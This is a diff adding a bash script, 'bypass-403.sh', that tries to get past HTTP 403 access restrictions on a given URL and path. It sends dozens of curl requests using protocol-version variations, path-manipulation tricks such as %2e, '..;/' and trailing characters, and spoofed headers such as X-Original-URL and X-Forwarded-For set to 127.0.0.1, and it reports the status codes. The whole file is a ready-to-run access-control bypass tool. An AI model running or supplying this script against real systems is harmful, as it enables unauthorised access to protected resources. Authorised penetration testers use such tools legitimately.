@@ -1,0 +1,88 @@
+GNU nano 7.2                                                      go/bin/bypass-403.sh
+#! /bin/bash
+figlet Bypass-403
+echo "                                               By Iam_J0ker"
+echo "./bypass-403.sh https://example.com path"
+echo " "
+curl -H 'User-Agent:' -H 'Accept:' -H 'Host:' --http2 -k -s -o /dev/null  -iL -w "%{http_code}","%{size_download}" $1/$2
+echo "  --> ${1}/${2} Protocol 2.0 GET"
+curl -H 'User-Agent:' -H 'Accept:' -H 'Host:' --http1.1 -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
+echo "  --> ${1}/${2} Protocol 1.1 GET"
+curl -H 'User-Agent:' -H 'Accept:' -H 'Host:' --http1.0  -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
+echo "  --> ${1}/${2} Protocol 1.0 GET"
+curl -H 'User-Agent:' -H 'Accept:' -H 'Host:' --http0.9  -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
+echo "  --> ${1}/${2} Protocol 0.9 GET"
+
+curl -X POST -H 'User-Agent:' -H 'Accept:' -H 'Host:' -H 'Content-Length:0' --http2 -k -s -o /dev/null  -iL -w "%{http_code}","%{size_download}" $1/$2
+echo "  --> ${1}/${2} Protocol 2.0 POST Length"
+curl -X POST -H 'User-Agent:' -H 'Accept:' -H 'Host:' -H 'Content-Length:0' --http1.1 -k -s -o /dev/null  -iL -w "%{http_code}","%{size_download}" $1/$2
+echo "  --> ${1}/${2} Protocol 1.1 POST Length"
+curl -X POST -H 'User-Agent:' -H 'Accept:' -H 'Host:' -H 'Content-Length:0' --http1.0  -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
+echo "  --> ${1}/${2} Protocol 1.0 POST Length"
+curl -X POST -H 'User-Agent:' -H 'Accept:' -H 'Host:' -H 'Content-Length:0' --http0.9 -k -s  -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
+echo "  --> ${1}/${2} Protocol 0.9 POST Length"
+
+curl -X POST -H 'User-Agent:' -H 'Accept:' -H 'Host:' --http2 -k -s -o /dev/null  -iL -w "%{http_code}","%{size_download}" $1/$2
+echo "  --> ${1}/${2} Protocol 2.0 POST"
+curl -X POST -H 'User-Agent:' -H 'Accept:' -H 'Host:' --http1.1 -k -s -o /dev/null  -iL -w "%{http_code}","%{size_download}" $1/$2
+echo "  --> ${1}/${2} Protocol 1.1 POST"
+curl -X POST -H 'User-Agent:' -H 'Accept:' -H 'Host:' --http1.0  -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
+echo "  --> ${1}/${2} Protocol 1.0 POST"
+curl -X POST -H 'User-Agent:' -H 'Accept:' -H 'Host:' --http0.9 -k -s  -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
+echo "  --> ${1}/${2} Protocol 0.9 POST"
+
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
+echo "  --> ${1}/${2}"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
+echo "  --> ${1}/%2e/${2}"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
+echo "  --> ${1}/${2}/."
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
+echo "  --> ${1}//${2}//"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
+echo "  --> ${1}/./${2}/./"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Host: $2" $1/$2
+echo "  --> ${1}/${2} -H Host: 127.0.0.1"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
+echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
+echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
+echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
+echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
+echo "  --> ${1} -H X-rewrite-url: ${2}"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20
+echo "  --> ${1}/${2}%20"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09
+echo "  --> ${1}/${2}%09"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?
+echo "  --> ${1}/${2}?"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html
+echo "  --> ${1}/${2}.html"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?anything
+echo "  --> ${1}/${2}/?anything"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2#
+echo "  --> ${1}/${2}#"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2
+echo "  --> ${1}/${2} -H Content-Length:0 -X POST"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/*
+echo "  --> ${1}/${2}/*"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.php
+echo "  --> ${1}/${2}.php"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
+echo "  --> ${1}/${2}.json"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
+echo "  --> ${1}/${2}  -X TRACE"
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2
+echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2"..;/"
+echo "  --> ${1}/${2}..;/"
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}"  $1/$2";/"
+echo "  --> ${1}/${2};/"
+#updated
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
+echo "  --> ${1}/${2} -X TRACE"
+echo "Way back machine:"
+curl -s  https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'
